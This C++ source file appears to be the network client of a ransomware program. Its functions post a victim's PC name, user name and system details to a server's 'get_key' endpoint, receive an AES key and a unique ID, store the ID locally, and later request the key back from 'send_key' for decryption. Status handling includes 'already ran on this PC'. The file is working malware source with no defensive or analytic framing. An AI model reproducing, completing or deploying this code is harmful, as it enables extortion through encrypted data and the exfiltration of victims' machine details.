#include "pch.h"
#include "HttpClient.h"
#include "JsonParser.h"


using namespace std;


bool sendRequestToEncrypt(wstring server_ip, DWORD server_port, string& aes_key){
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer = NULL;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
	hConnect = NULL,
	hRequest = NULL;

	string post = getPostData();
	string in_json;
	string json_err;
	DWORD post_len = strlen(post.c_str());
	DWORD dwBytesWritten = 0;

	// obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) {
		cout << "Error in WinHttpOpen: " << to_string(GetLastError()) << endl;
		return false;
	}

	// Specify an HTTP server. You can change this to a differnt IP and Port.
	hConnect = WinHttpConnect(hSession, server_ip.c_str(), server_port, 0);
	if (!hConnect) {
		cout << "Error in WinHttpOpen: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		return false;
	}

	// Create an HTTP request handle.
	hRequest = WinHttpOpenRequest(hConnect, L"POST", L"get_key", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);

	if (!hRequest) {
		cout << "Error in WinHttpOpenRequest: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		return false;
	}

	// Send a request.
	bResults = WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded", -1, (LPVOID)post.c_str(), post_len, post_len, NULL);
	if (!bResults) {
		cout << "Error in WinHttpSendRequest: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hRequest);
		return false;
	}

	// End the request.
	bResults = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResults) {
		cout << "Error in WinHttpReceiveResponse: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hRequest);
		return false;
	}


	// Check for available data.
	dwSize = 0;
	if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
		cout << "ERROR in WinHttpQueryDataAvailable: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hRequest);
		return false;
	}

	if (dwSize > 1024 * 10) {
		cout << "ERROR: incoming response from server is too large" << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hRequest);
		return false;
	}

	// Allocate space for the buffer.
	pszOutBuffer = new char[dwSize + 1];
	if (!pszOutBuffer) {
		cout << "ERROR in WinHttpQueryDataAvailable: Out of memory"  << endl;
		dwSize = 0;
	}
	else {
		// Read the data.
		ZeroMemory(pszOutBuffer, dwSize + 1);
		if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
			cout << "ERROR in WinHttpReadData: " << to_string(GetLastError()) << endl;
		else
			in_json = pszOutBuffer;
	}

	// Free the memory allocated to the buffer.
	delete[] pszOutBuffer;

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	auto response = json11::Json::parse(in_json, json_err);
	string response_status = response["status"].string_value();
	string uid = response["unique_id"].string_value();
	aes_key = response["base64_aes_key"].string_value();
	
	//checking json integrity
	if (uid == "" || aes_key == "")
		response_status = "0";

	if (response_status == "1") {
		//checking unique_id and aes_key integrity
		if (aes_key.size() != 44)
			return false;
		if (uid.size() != 32)
			return false;
		//writing uid to local text file
		if (!writeUID(uid))
			return false;
		return true;
	}
	checkResponseStatus(response_status);
	return false;
}


bool sendRequestToDecrypt(wstring server_ip, DWORD server_port, string& returned_aes_base64_key){
	string uid;
	if (!readUID(uid))
		return false;

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer = NULL;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
	hConnect = NULL,
	hRequest = NULL;

	string post = "unique_id=" + uid;
	string in_json;
	string json_err;
	DWORD post_len = strlen(post.c_str());
	DWORD dwBytesWritten = 0;

	// obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) {
		cout << "Error in WinHttpOpen: " << to_string(GetLastError()) << endl;
		return false;
	}

	// Specify an HTTP server. You can change this to a differnt IP and Port.
	hConnect = WinHttpConnect(hSession, server_ip.c_str(), server_port, 0);
	if (!hConnect) {
		cout << "Error in WinHttpOpen: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		return false;
	}

	// Create an HTTP request handle.
	hRequest = WinHttpOpenRequest(hConnect, L"POST", L"send_key", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
	if (!hRequest) {
		cout << "Error in WinHttpOpenRequest: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		return false;
	}

	// Send a request.
	bResults = WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded", -1, (LPVOID)post.c_str(), post_len, post_len, NULL);
	if (!bResults) {
		cout << "Error in WinHttpSendRequest: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hRequest);
		return false;
	}

	// End the request.
	bResults = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResults) {
		cout << "Error in WinHttpReceiveResponse: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hRequest);
		return false;
	}

	// Check for available data.
	dwSize = 0;
	if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
		cout << "ERROR in WinHttpQueryDataAvailable: " << to_string(GetLastError()) << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hRequest);
		return false;
	}

	if (dwSize > 1024 * 10) {
		cout << "ERROR: incoming response from server is too large" << endl;
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hRequest);
		return false;
	}

	// Allocate space for the buffer.
	pszOutBuffer = new char[dwSize + 1];
	if (!pszOutBuffer) {
		cout << "ERROR in WinHttpQueryDataAvailable: Out of memory" << endl;
		dwSize = 0;
	}
	else {
		// Read the data.
		ZeroMemory(pszOutBuffer, dwSize + 1);
		if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
			cout << "ERROR in WinHttpReadData: " << to_string(GetLastError()) << endl;
		else
			in_json = pszOutBuffer;
	}

	// Free the memory allocated to the buffer.
	delete[] pszOutBuffer;

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	auto response = json11::Json::parse(in_json, json_err);
	string response_status = response["status"].string_value();
	returned_aes_base64_key = response["base64_aes_key"].string_value();

	//checking json integrity
	if (returned_aes_base64_key == "")
		response_status = "0";

	if (response_status == "1") {
		//checking aes_key integrity
		if (returned_aes_base64_key.size() != 44)
			return false;
		return true;
	}
	checkResponseStatus(response_status);
	return false;
}


bool writeUID(string uid) {
	fstream fs("unique_id.txt", ios::out);
	if (fs) {
		fs << uid;
		cout << endl;
		cout << "Unique id written to unique_id.txt sucessfully" << endl;
		cout << endl;
		fs.close();
		return true;
	}
	else
		cout << "Error writing unique id" << endl;
	return false;
}


bool readUID(string &uid){
	fstream fs("unique_id.txt", ios::in);
	if (fs) {
		fs >> uid;
		if (uid.size() != 32)
			return false;
		cout << endl;
		cout << "Unique id read from unique_id.txt sucessfully" << endl;
		cout << endl;
		fs.close();
		return true;
	}
	else
		cout << "Error reading unique id" << endl;
	return false;
}

void checkResponseStatus(string & response_status){
	string error = "";
	if (response_status == "2") 
		error = "Error: already ran on this PC";
	else if (response_status == "3")
		error = "Error with one or more parameters sent to server";
	else if (response_status == "4") 
		error = "Error: unique_id sent was not found";
	else if (response_status == "0") 
		error = "Error in json parsing from server";
	else 
		error = "General Error in Http client from server";
	cout << endl;
	cout << error << endl;
}


string getPostData(){
	string windows_details = getOsVersion();
	string pc_details = getSystemInfo();
	string pc_name = getPCAndUserNames();
	string post = "pc_name=" + pc_name + "&pc_details=" + pc_details + "&windows_details=" + windows_details;
	return post;
}
